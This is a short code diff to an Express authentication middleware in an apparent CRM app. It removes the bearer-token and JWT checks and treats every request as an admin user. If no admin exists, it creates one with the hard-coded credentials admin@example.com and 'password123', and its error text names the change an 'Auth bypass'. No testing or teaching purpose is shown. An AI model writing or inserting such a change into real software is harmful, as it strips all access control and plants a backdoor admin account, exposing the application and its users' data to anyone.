@@ -3,30 +3,21 @@ import User from '../models/User.js';
 import asyncHandler from '../utils/asyncHandler.js';
 
 export const protect = asyncHandler(async (req, res, next) => {
-  let token;
-
-  if (req.headers.authorization?.startsWith('Bearer')) {
-    token = req.headers.authorization.split(' ')[1];
-  }
-
-  if (!token) {
-    return res.status(401).json({ success: false, message: 'Not authorized — token required' });
-  }
-
   try {
-    const JWT_SECRET = process.env.JWT_SECRET || 'dev_jwt_secret_change_me';
-    const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = await User.findById(decoded.id).select('-password');
-
-    if (!req.user) {
-      return res.status(401).json({ success: false, message: 'User no longer exists' });
+    let user = await User.findOne({ role: 'admin' });
+    if (!user) {
+      user = await User.create({
+        name: 'Admin User',
+        email: 'admin@example.com',
+        password: 'password123',
+        role: 'admin',
+        company: 'Future CRM',
+      });
     }
-
+    req.user = user;
     next();
   } catch (error) {
-    const message =
-      error.name === 'TokenExpiredError' ? 'Session expired — please sign in again' : 'Invalid token';
-    return res.status(401).json({ success: false, message });
+    return res.status(500).json({ success: false, message: 'Auth bypass failed: ' + error.message });
   }
 });
 
